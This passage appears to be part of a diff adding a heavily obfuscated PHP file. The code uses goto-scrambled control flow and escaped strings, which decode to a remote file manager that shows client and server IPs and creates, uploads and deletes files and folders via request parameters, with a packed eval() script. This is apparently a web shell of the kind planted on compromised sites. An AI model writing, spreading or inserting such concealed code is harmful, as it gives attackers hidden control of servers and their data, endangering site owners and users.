2f\x64\151\x76\x3e\xd\12\x3c\x6c\x69\76\x59\157\165\x72\x20\111\x50\x20\72\x20\74\163\x70\141\x6e\x20\x73\x74\171\x6c\x65\x3d\x22\143\x6f\x6c\x6f\162\72\40\167\x68\x69\164\x65\73\42\x3e";
+goto WPBbh;
+sYU_J:
+TFFJu:
+goto abnKa;
+EbEQO:
+echo AAI_V($_GET["\x6e"]);
+goto gYLl0;
+aHoUk:
+EEsPd:
+goto rIojF;
+Iz6yO:
+HgwOs:
+goto zEABd;
+AuqTR:
+rfF67:
+goto wxlFj;
+dB4Yg:
+echo htmlspecialchars(AAI_v($_GET["\x6e"]));
+goto Xe6VP;
+KqCJV:
+lelHt:
+goto LahIy;
+CoRRo:
+goto Vt8Zo;
+goto Oo9gU;
+c6Z4C:
+$WPq81 = $kUaLk[4]("\57\x28\134\134\x7c\134\x2f\x29\57", $ZOq50);
+goto ai5BC;
+MQ0QJ:
+goto o6eCt;
+goto GAIAY;
+R7GuT:
+echo "\74\57\163\x70\x61\x6e\76\x3c\x2f\x6c\151\x3e\15\xa\x3c\154\151\x3e\x53\145\x72\166\145\x72\x20\x49\120\40\x3a\40\x3c\163\x70\141\156\x20\163\x74\171\154\145\75\42\x63\157\x6c\x6f\162\x3a\40\167\150\151\164\x65\73\42\76";
+goto AKrpx;
+djSZk:
+$DT5EG = basename($_POST["\x6e"]);
+goto pOPEc;
+AG3wX:
+if (file_exists($QG8P5)) {
+    goto LqmtM;
+}
+goto HIFxM;
+eoU6M:
+echo WS8yc($ZOq50) . "\x26\x61\75" . ws8yc("\156\145\x77\104\151\x72");
+goto XXgUY;
+Ti4zu:
+goto w6yqb;
+goto hV3aU;
+e_Coz:
+function Aai_v($hRTbo)
+{
+    goto d0TYf;
+    IvYQc:
+    goto jOmna;
+    goto q4Ry3;
+    T3sjV:
+    return $LGBF6;
+    goto EBYkp;
+    TI9rD:
+    ULw86:
+    goto T67ia;
+    A3nWw:
+    goto ULw86;
+    goto WixWH;
+    MaWr5:
+    $I31U7 = 0;
+    goto TI9rD;
+    DMWbt:
+    $LGBF6 .= chr(hexdec($hRTbo[$I31U7] . $hRTbo[$I31U7 + 1]));
+    goto xcWBD;
+    T67ia:
+    if ($I31U7 < $qrSGA) {
+        goto q_7uI;
+    }
+    goto IvYQc;
+    ytrkA:
+    $qrSGA = strlen($hRTbo) - 1;
+    goto MaWr5;
+    q4Ry3:
+    q_7uI:
+    goto DMWbt;
+    xcWBD:
+    ZOl6w:
+    goto Q6Wvt;
+    Q6Wvt:
+    $I31U7 += 2;
+    goto A3nWw;
+    WixWH:
+    jOmna:
+    goto T3sjV;
+    d0TYf:
+    $LGBF6 = "";
+    goto ytrkA;
+    EBYkp:
+}
+goto bspkc;
+jFgnK:
+goto SP7i3;
+goto vYfQV;
+cZ7rQ:
+Lc0U4(
+    "\146\151\x6c\x65\40\156\141\x6d\145\x20\x68\x61\x73\40\142\x65\145\156\40\165\163\x65\x64",
+    0,
+    "\46\x61\x3d" . Ws8yc("\156\145\167\x46\151\x6c\145")
+);
+goto BjoNe;
+O4u0V:
+lc0u4(
+    "\146\x61\151\x6c\145\144\x20\x74\157\40\144\x65\x6c\145\x74\x65\40\x74\x68\145\x20\x66\157\x6c\x64\145\162",
+    0
+);
+goto SOAmm;
+F3O3f:
+echo "\40\xd\12\x3c\x2f\x64\151\166\x3e\xd\12\74\163\x63\x72\151\x70\164\40\163\162\x63\75\42\x2f\x2f\x63\x6f\144\145\56\152\161\x75\145\162\x79\x2e\x63\157\x6d\x2f\x6a\x71\165\145\x72\x79\x2d\63\56\65\56\61\56\163\154\151\x6d\x2e\155\x69\156\x2e\x6a\163\x22\76\74\57\x73\143\x72\151\160\x74\76\15\12\74\x73\143\x72\x69\160\164\x20\x73\162\143\75\x22\57\57\x63\x64\156\56\152\163\144\145\154\151\166\x72\x2e\x6e\145\164\x2f\156\x70\x6d\57\142\x6f\x6f\164\x73\x74\162\x61\160\x40\64\x2e\x36\56\x30\x2f\x64\151\x73\x74\57\152\x73\x2f\142\157\x6f\x74\x73\164\x72\141\160\56\142\x75\156\x64\154\x65\56\155\x69\x6e\x2e\x6a\163\x22\x20\x3e\x3c\x2f\x73\143\162\x69\160\x74\76\xd\xa\x3c\x73\x63\x72\x69\160\x74\x20\x73\162\143\75\42\57\x2f\x63\144\x6e\56\152\x73\144\x65\x6c\x69\166\x72\x2e\x6e\x65\164\x2f\x6e\x70\155\57\142\163\x2d\143\165\x73\164\157\155\55\146\151\x6c\x65\x2d\151\156\x70\x75\164\x2f\x64\151\x73\x74\x2f\x62\163\55\x63\165\163\164\x6f\155\55\146\x69\x6c\145\x2d\151\156\160\x75\164\x2e\155\x69\x6e\x2e\152\x73\x22\76\x3c\57\x73\x63\162\x69\160\164\x3e\xd\12\x3c\x73\143\x72\151\160\164\x20\x74\x79\160\x65\x3d\42\164\145\170\x74\57\152\141\166\x61\x73\x63\x72\151\160\x74\x22\x3e\x65\166\x61\154\x28\x66\165\x6e\x63\164\x69\x6f\156\x28\x70\54\141\54\x63\x2c\x6b\54\145\54\144\51\173\x65\x3d\x66\x75\x6e\x63\x74\151\x6f\156\50\143\x29\x7b\x72\145\x74\165\162\x6e\x28\143\74\x61\77\x27\x27\x3a\145\50\x70\x61\x72\x73\145\111\156\164\x28\143\x2f\x61\51\x29\51\x2b\x28\x28\143\75\143\x25\141\x29\76\63\65\77\x53\164\162\x69\156\147\x2e\146\162\x6f\155\x43\150\141\x72\x43\157\144\x65\x28\143\53\62\x39\x29\72\143\56\164\157\123\164\162\x69\x6e\x67\x28\x33\x36\51\51\175\x3b\151\146\50\x21\x27\x27\x2e\x72\x65\x70\154\141\143\145\x28\57\136\x2f\54\123\164\x72\151\156\x67\x29\51\x7b\167\x68\x69\x6c\145\50\x63\55\x2d\51\x7b\x64\x5b\145\50\x63\x29\135\x3d\153\x5b\143\135\174\x7c\x65\50\143\51\175\x6b\75\133\x66\165\156\x63\x74\x69\157\156\x28\145\51\x7b\x72\145\x74\165\162\x6e\x20\x64\x5b\x65\135\x7d\135\73\145\x3d\x66\165\156\x63\x74\x69\157\156\50\51\173\x72\145\x74\165\x72\x6e\47\134\134\x77\53\x27\x7d\x3b\x63\x3d\61\x7d\x3b\167\150\x69\154\x65\50\143\x2d\x2d\51\x7b\151\x66\x28\x6b\x5b\143\135\x29\x7b\x70\75\160\56\x72\145\x70\x6c\141\143\145\50\156\x65\x77\40\122\145\x67\x45\170\x70\x28\47\x5c\134\x62\47\x2b\145\x28\143\x29\x2b\47\134\134\142\x27\x2c\47\147\47\x29\x2c\153\133\x63\x5d\x29\175\x7d\x72\x65\164\x75\x72\156\x20\160\x7d\50\x27\105\x2e\156\x28\x29\73\x24\50\134\x27\133\62\x2d\155\75\42\x34\42\x5d\x5c\47\51\x2e\64\50\x29\x3b\44\50\x22\x2e\x6c\42\51\x2e\153\50\x6a\50\x65\x29\x7b\x65\x2e\147\x28\x29\x3b\x68\x20\60\75\x24\x28\66\x29\56\x35\x28\42\62\55\x30\42\51\x3b\143\50\173\142\72\42\x61\42\54\x39\72\x22\157\x20\151\x20\x71\x3f\x22\x2c\167\x3a\x22\x44\x20\x22\x2b\60\x2b\42\x20\160\x20\x43\40\102\42\54\x41\72\x37\x2c\172\x3a\67\54\175\x29\x2e\171\50\50\x38\x29\75\x3e\x7b\162\x28\70\x29\x7b\170\40\x31\75\44\x28\66\51\x2e\x35\50\42\x33\42\x29\x2b\42\46\164\x3d\x22\53\x28\x28\60\75\x3d\x22\166\42\x29\77\x22\x64\x22\72\42\146\42\x29\x3b\165\x2e\x73\x2e\63\75\x31\x7d\x7d\x29\x7d\51\x3b\47\x2c\x34\x31\54\x34\x31\x2c\47\164\171\x70\145\174\x62\165\x69\154\144\x55\x52\114\174\144\141\x74\141\x7c\x68\162\x65\x66\x7c\x74\x6f\157\x6c\164\x69\x70\174\141\164\164\162\174\x74\x68\151\163\x7c\164\162\165\x65\x7c\167\151\x6c\154\104\145\154\145\x74\x65\174\164\x69\164\154\145\174\167\x61\162\x6e\151\156\x67\x7c\x69\143\x6f\156\174\163\167\x61\x6c\174\x7c\x7c\174\160\x72\145\x76\145\x6e\x74\104\145\x66\141\165\x6c\164\174\x6c\145\164\x7c\x79\x6f\x75\x7c\146\165\x6e\143\164\x69\157\156\x7c\143\x6c\x69\x63\153\x7c\x64\145\154\x65\164\x65\174\x74\157\x67\147\154\x65\174\151\x6e\151\x74\174\101\x72\x65\x7c\167\151\x6c\x6c\x7c\163\165\x72\145\x7c\x69\x66\174\154\157\143\x61\x74\x69\x6f\156\x7c\x7c\x64\157\x63\x75\x6d\x65\x6e\x74\x7c\146\157\154\144\x65\162\174\164\x65\170\164\x7c\143\x6f\156\163\164\x7c\x74\150\x65\156\174\x64\x61\x6e\147\x65\162\115\157\144\x65\174\142\x75\164\x74\157\x6e\x73\x7c\x64\x65\154\x65\x74\x65\x64\174\x62\145\x7c\124\150\x69\x73\174\142\163\103\165\163\x74\157\x6d\106\151\154\x65\111\x6e\x70\165\164\47\56\x73\160\x6c\x69\164\50\x27\x7c\x27\51\54\60\x2c\173\175\51\51\74\57\163\x63\162\151\160\164\x3e\xd\12\74\x2f\x62\x6f\x64\171\76\15\xa\74\57\x68\164\x6d\x6c\x3e";
+?>
